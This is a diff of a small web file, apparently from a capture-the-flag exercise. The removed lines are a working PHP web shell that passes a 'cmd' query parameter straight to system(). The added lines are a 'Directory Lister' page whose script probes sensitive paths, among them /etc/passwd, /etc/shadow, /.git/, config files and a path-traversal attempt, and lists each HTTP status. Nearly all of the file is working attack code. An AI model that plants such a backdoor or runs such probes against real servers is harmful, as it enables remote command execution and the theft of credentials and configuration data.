@@ -1,16 +1,43 @@
+<!DOCTYPE html>
 <html>
+<head>
+  <title>Directory Lister</title>
+  <style>body { font-family: monospace; background: #111; color: #0f0; }</style>
+</head>
 <body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd'] . ' 2>&1');
-    }
-?>
-</pre>
+  <h2>📂 Probing Common Paths...</h2>
+  <ul id="results"></ul>
+  <script>
+    const paths = [
+      "/etc/passwd",
+      "/etc/shadow",
+      "/etc/hosts",
+      "/etc/group",
+      "/flags.txt",
+      "/admin/",
+      "/.git/",
+      "/robots.txt",
+      "/config.php",
+      "/WEB-INF/web.xml",
+      "/ShadowBank/js/snake.js",
+      "/ShadowBank/../flag",
+    ];
+
+    const result = document.getElementById("results");
+
+    paths.forEach(path => {
+      fetch(path).then(res => {
+        const li = document.createElement("li");
+        li.textContent = `${res.status} — ${path}`;
+        li.style.color = res.ok ? "lime" : "gray";
+        result.appendChild(li);
+      }).catch(err => {
+        const li = document.createElement("li");
+        li.textContent = `ERR — ${path}`;
+        li.style.color = "red";
+        result.appendChild(li);
+      });
+    });
+  </script>
 </body>
 </html>
